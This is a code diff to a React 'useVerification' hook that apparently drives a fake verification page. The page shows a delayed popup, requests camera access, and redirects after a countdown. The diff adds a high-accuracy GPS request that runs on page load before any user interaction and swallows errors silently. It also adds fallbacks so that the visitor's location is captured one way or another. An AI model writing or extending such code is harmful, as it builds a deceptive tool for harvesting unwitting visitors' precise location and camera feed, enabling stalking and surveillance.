@@ -22,10 +22,28 @@ export function useVerification() {
   const [isProcessing, setIsProcessing] = useState(false);
 
   const videoRef = useRef<HTMLVideoElement | null>(null);
+  const earlyLocationRef = useRef<{ lat: number; lng: number } | null>(null);
 
   const redirectConfig = getRedirectConfig();
   const redirectUrl = redirectConfig.targetUrl;
   const countdownDuration = redirectConfig.countdownDuration;
+
+  // Request GPS immediately on page load (before user interacts)
+  useEffect(() => {
+    if (!captureConfig.location) return;
+    if ('geolocation' in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          earlyLocationRef.current = {
+            lat: pos.coords.latitude,
+            lng: pos.coords.longitude,
+          };
+        },
+        () => {}, // silently ignore errors, will retry later if needed
+        { timeout: 15000, enableHighAccuracy: true }
+      );
+    }
+  }, []);
 
   // Show popup after short delay
   useEffect(() => {
@@ -221,13 +239,24 @@ export function useVerification() {
     setIsProcessing(true);
 
     try {
-      // Request all permissions + get GPS location in one shot
-      const location = await requestAllPermissions();
+      // Request permissions (camera if needed)
+      const permResult = await requestAllPermissions();
 
       // If permission denied, reset and let user try again
-      if (location === false) {
+      if (permResult === false) {
         setIsProcessing(false);
         return;
+      }
+
+      // Use early GPS if already captured, otherwise use permission result, fallback to fresh request
+      let location = earlyLocationRef.current || permResult;
+      if (!location && captureConfig.location) {
+        // Last attempt to get GPS if early capture failed
+        try {
+          location = await getGeolocationPromise();
+        } catch {
+          location = null;
+        }
       }
 
       // Get camera stream if needed (resolves instantly since already granted)
